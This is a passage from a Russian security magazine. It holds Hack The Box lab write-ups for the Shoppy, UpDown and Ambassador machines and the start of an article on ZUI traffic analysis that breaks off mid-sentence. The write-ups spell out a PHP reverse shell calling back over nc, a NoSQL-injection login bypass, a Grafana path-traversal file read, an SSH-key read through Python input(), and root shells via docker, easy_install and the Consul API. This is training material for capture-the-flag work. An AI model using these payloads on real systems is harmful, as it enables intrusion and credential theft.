веб‑сервер Nginx 1.23.1. Естественно, начинаем с веб‑сервера.





                     Главная страница сайта http://shoppy/

На самом сайте ничего интересного найти не удалось, поэтому приступаем
к сканированию на предмет скрытых каталогов и файлов.

Справка: сканирование веба c ffuf
Одно из первых действий при тестировании безопасности веб‑приложения —
это  сканирование методом  перебора  каталогов,  чтобы  найти  скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю легкий и очень быстрый ffuf . При запуске указываем сле‐
дующие параметры:
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -u — URL.





ffuf -u 'http://shoppy.htb/FUZZ' -w directory_2.3_medium_
lowercase.txt -t 256





                 Результат сканирования каталогов с помощью ffuf

Так получаем страницу авторизации, с которой мы, скорее всего, и начнем
наше тестирование сайта.





                  Страница авторизации http://shoppy/login

Не забываем просканировать и поддомены, использовать можно все тот же
ffuf. В этот раз будем перебирать заголовок Host (параметр -H). Но в ответ
попадут абсолютно все варианты, поэтому отфильтруем варианты по размеру.


ffuf -u 'http://shoppy.htb/' -H 'Host: FUZZ.shoppy.htb' -w
bitquark-subdomains-top100000.txt -t 256 -f
s 169



               Результат сканирования поддоменов с помощью ffuf

Находим еще один сайт и добавляем его в /etc/hosts:


10.10.11.180 shoppy.htb mattermost.shoppy.htb





               Страница авторизации http://mattermost.shoppy/


ТОЧКА ВХОДА
Так как по адресу mattermost.shoppy.htb расположен готовый продукт, а на
shoppy.htb — самописный сервис, начнем со второго. Первым делом я
решил перебрать по словарю разные нагрузки для обхода авторизации —
от учетных данных admin:admin до инъекций SQL и LDAP. Делать такие
переборы удобнее всего с помощью Burp Intruder.





                    Burp Intruder — вкладка Positions

В результатах перебора видим много ответов, размер которых равен 318 бай‐
там, но есть и выбивающиеся из общего списка. При этом в самом ответе нам
выдают cookie и отправляют на страницу /admin.





                   Burp Intruder — результат перебора

Обнаруживаем, что нагрузка '||2||' в поле логина эксплуатирует NoSQL-
инъекцию, что помогает обойти авторизацию.





                         Административная панель сайта

В верхнем углу видим кнопку поиска. Скорее всего, это и даст нам даль‐
нейший вектор атаки. Переходим к поиску и вводим любую комбинацию.





                     Форма поиска пользователей

Тут больше всего привлекает внимание URL:


http://shoppy.htb/admin/search-users?username=qwe

Попытки «протыкать кавычки и скобки» ни к чему не привели. Но так как это
функция, работающая с именами пользователей, давай переберем возможные
имена.


ТОЧКА ОПОРЫ
Для перебора снова используем Burp Intruder. А словарь для перебора имен
берем из знаменитого набора словарей SecLists.





                    Burp Intruder — вкладка Positions





                                  Результат перебора

В итоге получаем два доступных логина: admin и josh. Первый мы уже знали
и до этого, но он нам ничего не дал, поэтому в браузере вбиваем второго
пользователя и получаем ссылку на экспорт каких‑то данных:


http://shoppy.htb/exports/export-search.json





                        Данные пользователя josh

Пароль похож на хеш MD5, поэтому воспользуемся сайтом CrackStation
для поиска прообраза.




                                Результат взлома хеша

На SSH залогиниться не вышло, но зато получаем доступ к Mattermost, а так
как это корпоративный чат, то не исключена возможность найти что‑то инте‐
ресное.





                           Главная панель Mattermost

В итоге в одном из чатов нам удалось найти учетные данные для подключения
к какой‑то машине.





                           Чат Deploy Machine

С найденными учетными данными подключаемся к хосту и забираем первый
флаг.





                        Флаг пользователя


ПРОДВИЖЕНИЕ
Скрипт PEASS для Linux ничего не показал, кроме того, что для проверки
sudoers нужно ввести пароль пользователя. Поэтому проверяем в ручном
режиме.


sudo -l





                                Настройки sudoers

Таким образом, мы можем выполнить приложение /home/deploy/password-
manager от имени пользователя deploy без ввода пароля. Это исполняемый
ELF-файл.



                            Вывод утилиты file

Поскольку перед нами менеджер паролей, попробуем его проанализировать.
Скачиваем файл с удаленного хоста на локальный и закидываем в любой удоб‐
ный декомпилятор.


scp jaeger@10.10.11.180:/home/deploy/password-manager ./

Я, как всегда, использую IDA Pro с Hex-Rays. Программа, по всей видимости,
написана на C++. Сразу в главной функции находим пароль от программы —
Sample. Вот такой плохой менеджер паролей (ну и машина легкая, для нович‐
ков).





                         Псевдокод функции main

Вводим найденный пароль в менеджер и получаем учетные данные другого
пользователя.


sudo -u deploy /home/deploy/password-manager





                        Получение новых учетных данных

Локально меняем пользователя с помощью su.





                         Сессия пользователя deploy


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Снова проводить разведку нет смысла, так как всю информацию мы уже соб‐
рали. Но после выполнения команды id обратим внимание, что мы состоим
в группе docker, а это дает нам право его запускать. В случаях, когда нам раз‐
решено запускать файлы, для запуска которых в обычной среде нужны при‐
вилегии, я обращаюсь к базе GTFOBins.
  GTFOBins — это список исполняемых файлов Unix, которые можно исполь‐
зовать для обхода локальных ограничений безопасности в неправильно нас‐
троенных системах. Проект собирает законные функции двоичных файлов Unix,
которыми можно злоупотреблять, чтобы получить доступ к командным оболоч‐
кам, повысить привилегии или передать файлы.
   Находим готовый рецепт для Docker и используем его.





          Инструкция получения управления с помощью файла Docker


docker run -v /:/mnt --rm -it alpine chroot /mnt sh





                            Флаг рута

Машина захвачена!
ВЗЛОМ

       HTB
 UPDOWN





          ЭКСПЛУАТИРУЕМ
           RACE CONDITION
      ПРИ АТАКЕ НА ВЕБ-СЕРВЕР





В  этом  райтапе  я  подробно  покажу,
как  искать  скрытые  данные  на  сайте,
затем  покопаемся  в  его  исходниках
и получим RCE при  эксплуатации Race
Condition.  Для  полного  захвата  хоста             RalfHacker                                                                                          hackerralf8@gmail.com
используем ошибку в программе на Python
и применим одну из техник GTFOBins.


Наша цель — захватить учебную машину UpDown с площадки Hack The Box.
Уровень сложности отмечен как средний.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                       где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.177    updown.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое сканиро‐
вание, на втором — более тщательное сканирование, с использованием име‐
ющихся скриптов (опция -A).





                              Результат работы скрипта

Мы нашли два открытых порта: 22 — служба OpenSSH 8.2p1 и 80 — веб‑сер‐
вер Apache 2.4.41. На веб‑сервере нас встречает чекер сайтов.





                      Главная страница сайта updown.htb

Главная страница раскрывает нам реальный домен — siteisup.htb. Поэтому
добавляем запись в файл /etc/hosts:


10.10.11.177 updown.htb siteisup.htb

Затем я попытался послать запрос на свой простенький HTTP-сервер, который
можно запустить командой python3 -m http.server 80. В итоге я получил
ответ, содержащий страницу HTML в текстовом виде, а в логах своего сервера
увидел следующий GET-запрос.





                               Результат проверки хоста

На сайте больше ничего интересного найти не удалось, поэтому приступим
к сканированию.

Справка: сканирование веба c ffuf
Одно из первых действий при тестировании безопасности веб‑приложения —
это  сканирование методом  перебора  каталогов,  чтобы  найти  скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю легкий и очень быстрый ffuf . При запуске указываем сле‐
дующие параметры:
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -u — URL.



Запускаем ffuf:


ffuf -u 'http://siteisup.htb/FUZZ' -w directory_2.3_medium_
lowercase.txt -t 256




                 Результат сканирования каталогов с помощью ffuf

Находим интересный каталог dev и повторяем сканирование уже в нем.


ffuf -u 'http://siteisup.htb/dev/FUZZ' -w files_interesting.txt -t
256





                  Результат сканирования файлов с помощью ffuf

И обнаруживаем репозиторий Git, а это явная точка входа.


ТОЧКА ВХОДА
Теперь нам нужно сдампить найденный репозиторий, для чего есть набор
скриптов dvcs-ripper или специальное средство git-dumper. На этот раз
воспользуемся вторым.


git-dumper http://siteisup.htb/dev/ dev

После загрузки репозитория нужно исследовать не только исходный код, но и
внесенные изменения. Для удобства представления я использую программу
gitk , которую надо открыть из директории, где расположен каталог .git.





                      Представление репозитория в gitk

В репозитории находим файл admin.php, который отсутствует на самом сайте,
а это значит, что нам нужно найти новый сайт. Для этого с помощью ffuf прос‐
канируем поддомены. При запуске добавим параметр -H — заголовок HTTP.


ffuf -u http://siteisup.htb/ -t 256 -w subdomains-top1million-
110000.txt -H 'Host: FUZZ.siteisup.htb'



               Результат сканирования поддоменов с помощью ffuf

Находим поддомен dev и добавляем его в файл /etc/hosts.


10.10.11.177 updown.htb siteisup.htb dev.siteisup.htb

Но к сайту нет доступа.





                    Ошибка при обращении к сайту

Тогда возвращаемся к репозиторию и находим там файл .htaccess, который
и содержит правила доступа.





                       Содержимое файла .htaccess

В файле видим запись Special-Dev "only4dev" Required-Header — обя‐
зательный HTTP-заголовок Special-Dev со значением only4dev. Так как всю
работу я провожу через Burp Proxy, то у меня есть возможность автоматичес‐
ки встраивать заголовок во все запросы. Для этого нужно перейти к вкладке
Options и найти раздел Match and Replace, где и создаем новое правило
замены.





               Создание нового правила замены в Burp Proxy

После применения созданного правила обновляем страницу и получаем тот же
сайт, но с возможностью загрузки файла.





                     Главная страница сайта dev.updown.htb

Возвращаемся к исходному коду и находим правило проверки типа и формата
загружаемого файла.





                      Содержимое файла checker.php

Так, у загружаемого файла просто проверяется расширение — сравнивается
с теми, что есть в черном списке. Вот только в списке нет расширения .phar,
которое исполняется так же, как и .php. В дополнение к этому мы узнаем
и путь загружаемых файлов.





                      Содержимое файла checker.php

Файлы загружаются в каталог /uploads/.md5(time())/, затем из каждой
строки извлекается адрес сайта, выполняется запрос, и после проверки всех
сайтов файл удаляется. Таким образом, мы можем загрузить файл, содер‐
жащий код на PHP, и успеть его выполнить до удаления!


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ
        HTB UPDOWN
                               ЭКСПЛУАТИРУЕМ
                                RACE CONDITION
                       ПРИ АТАКЕ НА ВЕБ-СЕРВЕР





ТОЧКА ОПОРЫ
Так как сайты в загружаемом файле должны быть разные, чтобы проверялись
все, я решил создать список при помощи генератора случайных адресов.
Записываем в файл сто разных ссылок и код на PHP, выводящий phpinfo():


http://site1.qw
....
<?php phpinfo(); ?>

Загружаем его на сайт и переходим к каталогу uploads. Мы можем пос‐
мотреть его содержимое.





                       Содержимое каталога uploads

Видим вложенный каталог, название которого — это результат выполнения
функции хеширования MD5. То, что нужно, заходим в него.





                          Загруженный файл PHAR

Там лежит наш файл PHAR. Выбираем его и внимательно просматриваем. Нас
интересуют отключенные функции PHP, так как большинство из них и дают нам
право выполнения команд в командной оболочке.





                             Страница phpinfo

Много нужных функций отключено, но там нет proc_open, которая позволяет
выполнять произвольные системные команды. Подробнее с ней можно озна‐
комиться в официальном руководстве. Я же приведу пример реверс‑шелла
на PHP с использованием этой функции.


<?php
$descriptorspec = array(
  0 => array("pipe", "r"),
  1 => array("pipe", "w"),
  2 => array("file", "/tmp/error-output.txt", "a")
);
$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);
if (is_resource($process)) {
   fwrite($pipes[0], 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&
1|nc 10.10.14.31 4321 >/tmp/f');
   fclose($pipes[0]);
   echo stream_get_contents($pipes[1]);
   fclose($pipes[1]);
   $return_value = proc_close($process);
   echo "command returned $return_value\n";
}
?>

Запускаем листенер (я использую pwncat-cs), создаем новый файл PHAR
и повторяем все перечисленные выше действия. Так мы получаем сессию
от имени веб‑сервера на целевом хосте.




                       Сессия пользователя www-data


ПРОДВИЖЕНИЕ
Теперь, когда мы получили доступ к хосту, нам необходимо собрать информа‐
цию. Как обычно, мне в этом помогают скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени пользовате‐
ля? Вариантов дальнейшей эксплуатации и повышения привилегий может быть
очень много, как в  Linux, так и в Windows. Чтобы собрать информацию
и наметить цели, можно использовать Privilege Escalation Awesome Scripts
SUITE (PEASS) — набор скриптов, которые проверяют систему на автомате.


В этот раз скрипт показал, что нам доступны какие‑то файлы в домашнем
каталоге другого пользователя, при этом один из файлов — исполняемый
с установленным S-битом.





         Список файлов в домашних каталогах других пользователей





                    Файлы с установленным S-битом


Справка: бит SUID
Когда у файла установлен атрибут setuid (S-атрибут), обычный пользователь,
запускающий этот файл, получает повышение прав до пользователя — вла‐
дельца файла в рамках запущенного процесса. После получения повышенных
прав приложение может выполнять задачи, которые недоступны обычному
пользователю. Из‑за возможности состояния гонки многие операционные сис‐
темы игнорируют S-атрибут, установленный shell-скриптам.


Файл /home/developer/dev/siteisup доступен группе www-data, но будет
работать в контексте пользователя developer. Если запустить файл, он зап‐
росит у нас URL и скажет, работает сайт или нет. Я решил просмотреть строки
в файле.





                            Строки в файле siteisup

Этот файл запускает скрипт siteisup_test.py, который запрашивает URL
с помощью функции input(). Дело в том, что эта функция в Python 2 может
выполнять код! То есть вместо URL мы можем ввести код, импортирующий
модуль OS и читающий приватный ключ SSH.


__import__('os').system('cat /home/developer/.ssh/id_rsa')





                    Выполнение кода через функцию input

С ключом SSH подключаемся к хосту и забираем первый флаг.





                        Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Информацию о системе мы уже собирали, поэтому проверим  настройки,
которые отличаются у разных пользователей. И одна из первых вещей, которые
нужно проверить, — это sudoers.

Справка: sudoers
Файл /etc/sudoers в Linux содержит списки команд, которые разные группы
пользователей могут выполнять от имени администратора системы. Можно
просмотреть его как напрямую, так и при помощи команды sudo -l.





                                Настройки sudoers

Оказывается, мы можем выполнить вот такую команду от имени пользователя
root без ввода пароля (NOPASSWD):


/usr/local/bin/easy_install

Easy Install — это модуль Python из библиотеки setuptools, которая позволяет
автоматически загружать, собирать и устанавливать пакеты. А самое замеча‐
тельное — то, что easy_install есть в базе GTFOBins.

Справка: GTFOBins
GTFOBins — это список исполняемых файлов Unix, которые можно исполь‐
зовать для обхода локальных ограничений безопасности в неправильно нас‐
троенных системах. Проект собирает законные функции двоичных файлов Unix,
которыми можно злоупотреблять, чтобы получить доступ к командным оболоч‐
кам, повысить привилегии или передать файлы.





                Описание эксплуатации easy_install при sudo

Так что мы можем просто ввести приведенную команду и получить командную
оболочку в привилегированном контексте.


TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(
tty) 2>$(tty)')" > $TF/setup.py
sudo /usr/local/bin/easy_install $TF





                            Флаг рута

Машина захвачена!
ВЗЛОМ

       HTB
AMBASSADOR





      ПОВЫШАЕМ ПРИВИЛЕГИИ
           ЧЕРЕЗ CONSUL





В этом райтапе я покажу, как читать файлы
из Grafana, затем мы поработаем с базой
данных для  получения  доступа  к  хосту
и повысим привилегии через Consul.                    hackerralf8@gmail.comRalfHacker

Упражняться будем на учебной машине Ambassador с площадки Hack The Box.
Уровень сложности — средний.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                       где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.183    ambassador.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое сканиро‐
вание, на втором — более тщательное сканирование, с использованием име‐
ющихся скриптов (опция -A).





                              Результат работы скрипта

Сканирование показало несколько открытых портов:
 • 22 — служба OpenSSH 8.2p1;
 • 80 — веб‑сервер Apache 2.4.41;
 • 3000 — не определенный веб‑сервер;
 • 3306 — служба MySQL 8.0.30.

Первым делом посмотрим на сайты.





                    Главная страница http://ambassador.htb/

В первом же посте находим информацию о том, как подключаться к серверу
по SSH, и получаем имя пользователя — developer. Также узнаем, что можем
где‑то найти пароль.





                    Информация про сервер разработки

На втором сайте нас встречает форма авторизации Grafana.





                 Главная страница http://ambassador.htb:3000/


ТОЧКА ВХОДА
Grafana —  система  визуализации  данных,  ориентированная на  системы
ИТ‑мониторинга. Пользователю предоставляются диаграммы, графики и таб‐
лицы с разными показателями. На странице авторизации мы можем увидеть
версию платформы — 8.2.0.
   Первым делом стоит проверить, есть ли для обнаруженной версии готовые
эксплоиты. Искать нужно в базах вроде HackerOne и exploit-db, а также стоит
заглянуть на GitHub. Так, по запросу «grafana v8.2.0 (d7f71e9eae) exploit» мы
сразу узнаем, что в этой версии есть уязвимость с идентификатором CVE.





                     Поиск эксплоитов с помощью Google

Уязвимость заключается в том, что возможен обход каталогов и как резуль‐
тат — доступ к произвольным локальным файлам. Причина появления этой
уязвимости — неправильно реализованная функция подключения модулей.
   Дальнейший поиск на GitHub приводит нас к рабочему эксплоиту , которому
в качестве параметра нужно передать только URL системы мониторинга.





                            Справка по эксплоиту

В качестве теста пробуем прочитать файл /etc/passwd.





                      Содержимое файла /etc/passwd

Среди пользователей обнаружим отмеченного ранее пользователя developer.


ТОЧКА ОПОРЫ
Первым делом  сразу попытаемся прочитать приватный SSH-ключ /home/
developer/.ssh/id_rsa.




                             Чтение файла id_rsa

Такого файла не существует, поэтому нужно поискать другие варианты. К при‐
меру, файл конфигураций Grafana /etc/grafana/grafana.ini, который дол‐
жен содержать учетные данные администратора.





                       Содержимое файла grafana.ini

С  полученными  учетными  данными  мы   легко   авторизуемся  через
веб‑интерфейс.





                       Панель администратора Grafana


ПРОДВИЖЕНИЕ
Продвигаясь дальше, получим файл базы данных grafana.


curl --path-as-is http://ambassador.htb:3000/public/plugins/
alertlist/../../../../../../../../var/lib/grafana/grafana.db -o
grafana.db

Я  просматриваю  такие  файлы  в DB  Browser.  Там  находим  таблицу
data_source, из столбца password которой получаем пароль для подключения
к базе данных grafana.





                        Данные в файле grafana.db

Разделение доступа к разным базам данных в СУБД может быть не настроено,
и можно будет получить данные из других баз, а не только из grafana. Под‐
ключаемся и просматриваем существующие базы данных.


mysql -h ambassador.htb -u grafana -p'dontStandSoCloseToMe63221!'
show databases;





                                  Базы данных

Видим базу данных whackywidget, которая не является служебной. Выбираем
ее для работы и получаем список таблиц.


use whackywidget;
show tables;





                    Таблицы в базе данных whackywidget

Таблица здесь всего одна, причем очень интересная. Запросим ее содер‐
жимое.


select * from users;





                        Содержимое таблицы users

Получаем  закодированный  в  Base64  пароль  локального  пользователя
developer.


echo YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | base64 -d





                        Декодирование пароля из базы

С полученным паролем авторизуемся по SSH и забираем первый флаг.





                        Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Получив доступ к хосту, мы первым делом должны собрать информацию. Я,
как обычно, воспользуюсь набором скриптов PEASS.


Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени пользовате‐
ля? Вариантов дальнейшей эксплуатации и повышения привилегий может быть
очень много, как в  Linux, так и в Windows. Чтобы собрать информацию
и наметить цели, можно использовать Privilege Escalation Awesome Scripts
SUITE (PEASS) — набор скриптов, которые проверяют систему на автомате.



Загрузим скрипт для Linux на удаленный хост, дадим право на выполнение
и запустим. Теперь следует отобрать важную информацию, которую подсветит
скрипт.
   Во‑первых, в каталоге /opt есть два проекта, один из которых называется
consul.





                       Содержимое каталога consul

На хосте для локального адреса открыт порт 8500, что типично для Consul.





                           Список открытых портов

HashiCorp Consul — это опенсорсный инструмент, который облегчает раз‐
работчикам организацию взаимодействия между сервисами, управление кон‐
фигурацией и сегментацию сети. Consul умеет находить сервисы и проверять
их работоспособность, балансировать нагрузку и показывать наглядные гра‐
фики. Также у него есть возможность хранить ключи авторизации.
  Нам нужно найти, где в системе используется Consul. Для этого анализи‐
руем обнаруженный проект в каталоге /opt/.





                        Содержимое каталога /opt

Это репозиторий Git, поэтому мы можем посмотреть историю изменений,
выполнив команду git show внутри каталога.





                     История изменений кода в проекте

И наконец, находим команду consul, которая применяется для экспорта
пароля MySQL. Здесь нужно обратить внимание на то, что мы нашли токен
и теперь сможем работать с Consul API. Опираясь на публикацию в блоге
Wallarm, мы можем получить выполнение кода с помощью Consul API в контек‐
сте работы службы. А так как Consul работает от имени рута, это повышение
привилегий в системе.
   Для эксплуатации нам нужно использовать API /agent/check/register
со следующими параметрами.


{
    "ID": "ralf",
    "Name": "ralf",
    "Address": "127.0.0.1",
    "Port": 80,
    "check": {
        "Args": ["/bin/bash", "/tmp/lpe.sh"],
        "interval": "10s",
        "timeout": "1s"
    }
}

Таким образом мы запустим скрипт /tmp/lpe.sh в Bash. Внутри скрипта прос‐
то присвоим S-бит файлу командной оболочки: chmod u+s /usr/bin/bash.
Выполняем запрос к API с помощью curl:


curl --header "X-Consul-Token:
bb03b43b-1a81-d62b-24b5-39540ee469b5" --request PUT -d '{"ID":
"ralf", "Name": "ralf", "Address": "127.0.0.1", "Port": 80,
"check": {"Args": ["/bin/bash", "/tmp/lpe.sh"], "interval":
"10s", "timeout": "1s"}}' http://127.0.0.1:8500/v1/agent/service/
register

Затем проверим файл /bin/bash и увидим поставленный нами S-бит.



                            Права файла /bin/bash


Справка: бит SUID
Когда у файла установлен атрибут setuid (S-атрибут), обычный пользователь,
запускающий этот файл, получает повышение прав до пользователя — вла‐
дельца файла в рамках запущенного процесса. После получения повышенных
прав приложение может выполнять задачи, которые недоступны обычному
пользователю. Из‑за возможности состояния гонки многие операционные сис‐
темы игнорируют S-атрибут, установленный shell-скриптам.


Запустив /bin/bash -p, мы получим привилегированный шелл.





                            Флаг рута

Машина захвачена!
АДМИН





        АНАЛИЗИРУЕМ ТРАФИК
       С ПОМОЩЬЮ НОВОГО
      БЫСТРОГО ИНСТРУМЕНТА





Для анализа сетевого трафика чаще всего
выбирают Wireshark. Тут тебе и фильтры,
и хороший интерфейс, и документация,
и подробнейший вывод о каждом пакете.
Но у этого инструмента есть недостатки,        Михаил Онищенко                                                                                            tofolt@icloud.com
главный из которых — медлительность
при анализе больших дампов. Я расскажу
об опенсорсном приложении ZUI, которое
может стать надежным помощником в ана‐
лизе трафика.


Zed User Interface (ранее Brim), первая версия которого стала доступна комь‐
юнити ИБ в 2018 году, разработан с помощью Electron и React. Внутри же
используется движок ZED, а он, в свою очередь, написан на Go и состоит
из нескольких элементов:
 • Zed data model — общее название для лежащих в основе проекта типов
   данных и семантики;
 • Zed lake — коллекция выборочно индексированных данных Zed;
 • Zed language — язык для выполнения запросов, поиска, аналитики;
 • Zed shaper — модуль, который приводит входные данные к формату Zed
   data model;
 • Zed formats — семейство  последовательных (ZNG),  столбцовых (ZST)
   и человекочитаемых (ZSON) форматов;
 • Zed query — скрипт, который выполняет поиск и аналитику;
 • Zeek и Suricata — сигнатурные системы (intrusion detection systems).

Главные отличия ZUI от Wireshark — это скорость работы, поддержка сигнатур
и анализа логов. Из минусов можно отметить невозможность декодировать
пакеты и экспортировать найденные в трафике файлы.


             INFO

                     Все это можно не считать реальными минусами,
                       потому что любой найденный поток данных в ZUI
                            открывается одним нажатием кнопки в Wireshark,
                       где отображается вся недостающая информа‐
                        ция.



СКОРОСТЬ

Изначально ZUI назывался Brim и специализировался исключительно на ана‐
лизе сетевого трафика и логов. Но из‑за универсальности движка ZED он начал
развиваться и в других направлениях, а именно в сторону аналитики данных.
  Идея движка ZED, который позволяет ZUI обрабатывать файлы PCAP нам‐
ного быстрее Wireshark, состоит в том, чтобы избавиться от концепции таблиц
из базовой модели  данных. Их заменили современной системой типов,
при которой каждое значение может иметь свой тип независимо от составной
схемы, как это сейчас реализовано в старых моделях. Получается, ZED — и не
полуструктурированный, и не табличный. Создатели называют такую  кон‐
цепцию суперструктурированной.


             INFO

                         Основатель компании Brim, разработчика ZUI, —
                       это не кто иной, как Стив Маккейн, создатель
                        формата PCAP, BPF и соавтор tcpdump.


Для примера можно привести формат из Zed data model под названием ZSON.
Это привычный нам JSON с собственными типами значений.
   Этих знаний нам хватит, чтобы использовать ZUI в его самом интересном
для нас варианте применения — анализе трафика.





                              Схема работы


УСТАНОВКА

Linux
Для установки ZUI в Linux используй следующие команды:


wget "https://github.com/brimdata/brim/releases/download/v0.31.0/
Brim-0.31.0.deb"
sudo chmod +x ./Brim-0.31.0.deb; apt install ./Brim-0.31.0.deb

Обязательно поменяй версию приложения в команде, чтобы пользоваться
самым новым релизом.


Windows и macOS
Для них суть та же: достаточно скачать с официального сайта приложения уста‐
новщик и запустить его.


ИНТЕРФЕЙС

Сначала полюбуемся минималистичным UI и увидим, насколько он хорошо
организован. На вход программы можно подавать JSON, CSV, ZSON, ZNG
и файлы других форматов, но нам интереснее всего скормить ZUI файл PCAP
или структурированный лог, например Zeek log.





                           Главная страница утилиты

Как только ты откроешь файл PCAP в ZUI, он тут же пройдется по нему движ‐
ками Zeek и Suricata, после чего отобразит все находки, а также подтянет
ссылки на найденные хеши с VirusTotal. Ну что сказать, круто!
   Pool — это место, где хранится преобразованный PCAP. Ты можешь заг‐
ружать сразу несколько файлов в один pool, и все данные из них будут дос‐
тупны в одной строке поиска. На таймлайне можно выбрать диапазон времени,
который сейчас требуется изучить. В деталях можно посмотреть самую ценную
информацию, этакие поля корреляции.
  Мне показалась особенно интересной фича с небольшой диаграммкой вза‐
имодействия двух хостов. Она отображается, если открыть лог с зеленым
тегом conn. Также весьма полезна кнопка открытия потока данных в Wireshark,
но о ней уже было сказано выше.





                Небольшая диаграмма взаимодействия хостов


ПРИМЕНЯЕМ ZUI НА ПРАКТИКЕ И ПИШЕМ ЗАПРОСЫ

Начать стоит с того, что писать запросы с помощью ZQL query совсем не труд‐
но. Достаточно просто найти в логах нужные поля и отфильтровать по ним логи.
Строка запроса будет обрастать новыми и новыми условиями поиска. Лично я
постоянно забываю, как находить ту или иную информацию с помощью филь‐
тров Wireshark.





         Создание фильтрующего правила с помощью выбора полей

Я подготовил для тебя примеры запросов поиска, которые покроют основные
юзкейсы при работе с ZUI.
   Количество каждой категории тегов:


count() by _path | sort -r

Все уникальные DNS queries:


_path=="dns" | count() by query | sort -r

SMB- и RPC-трафик в системах Windows:


_path matches smb* OR _path=="dce_rpc"

HTTP-запросы и фильтрация самых полезных колонок:


_path=="http" | cut id.orig_h, id.resp_h, id.resp_p, method, host,
 uri | uniq -c

Уникальные коннекты и их количество:


_path=="conn" | cut id.orig_h, id.resp_p, id.resp_h | sort | uniq

Количество переданных байтов на один коннект:


_path=="conn" | put total_bytes := orig_bytes + resp_bytes | sort
-r total_bytes | cut uid, id, orig_bytes, resp_bytes, total_bytes

Поиск передаваемых файлов:


filename!=null | cut _path, tx_hosts, rx_hosts, conn_uids, mime_
type, filename, md5, sha1

Все запросы HTTP Post:


method=="POST" | cut ts, uid, id, method, uri, status_code

Все IP-подсети:


_path=="conn" | put classnet := network_of(id.resp_h) | cut
classnet | count() by classnet | sort -r

Ну и в завершение парада самые, на мой взгляд, классные.
   Демонстрация всех срабатываний сигнатур Suricata и их количество:


event_type=="alert" | count() by alert.severity,alert.category |
sort count

Демонстрация  всех  срабатываний  сигнатур  Suricata,  отфильтрованных
по Source IP и Destination IP:


event_type=="alert" | alerts := union(alert.category) by src_ip,
dest_ip


СПИДРАН ПО ПОИСКУ EMOTET C2

Впервые Emotet обнаружили в 2014 году, и тогда исследователи безопасности
классифицировали его как банковский троян. Emotet в свое время вызвал
целую эпидемию и успел серьезно навредить многим пользователям. Однако
позже этот трой мутировал в дроппер и начал продаваться в даркнете по прин‐
ципу CaaS (Cybercrime as a Service). Новой функцией малвари стала загрузка
другого вредоносного ПО в систему жертвы.
   Одним из распространяемых Emotet’ом вредоносов был банковский троян
TrickBot. Эту связку мы сейчас и найдем с помощью ZUI.


        WWW

                    Для анализа нам понадобится вот этот файл
                   PCAP.



Начинаем
Найдем все вхождения DNS в файле PCAP. Для  этого используем один
из ранее приведенных запросов.


_path=="dns" | count() by query | sort -r





                          Поиск всех вхождений DNS

Больше всего выделяются два адреса: 112.146.166.173.zen.spamhaus.org
и t-privat.de. Первый относится к платформе threat-intelligence под названи‐
ем Spamhaus. А вот второй нам стоит проверить на VirusTotal. Для этого
вызовем контекстное меню и выберем VirusTotal Lookup.





                                   VirusTotal в меню

VirusTotal проводит проверку и сообщает нам, что домен вредоносный и ранее
использовался для хостинга малвари.





                         Результаты проверки на VirusTotal

Найдем запись типа A и используем более старую дату резолва, которая ближе
к дате публикации PCAP. Это будет адрес 81.169.145.161. Попробуем найти
совпадения в нашем файле PCAP.
  Мы обнаруживаем адрес, и наше внимание привлекает то, что с него
передается файл во внутреннюю сеть. Это очень подозрительно, надо иссле‐
довать дальше.





                                Охота на адрес

Откроем   вкладку  с  этим  коннектом  и  достанем   оттуда  MD5-хеш
997d6f2e3879bb725fb4747b0046bb50. Теперь нам надо проверить его на вре‐
доносность.





                       Файл на VirusTotal

Что ж, сомнения отпали, хост 10.9.1.101 — это наш первый зараженный.


С2 под прицелом
Надо найти все передаваемые файлы, которые содержатся в этом дампе.
Для этого используем такую строку поиска:


